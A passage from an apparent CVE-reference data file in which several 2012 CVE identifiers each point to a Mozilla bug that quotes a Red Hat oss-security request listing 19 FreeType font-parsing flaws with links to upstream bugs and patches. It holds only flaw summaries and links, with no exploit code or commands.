Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1127": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1128": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1129": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1130": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
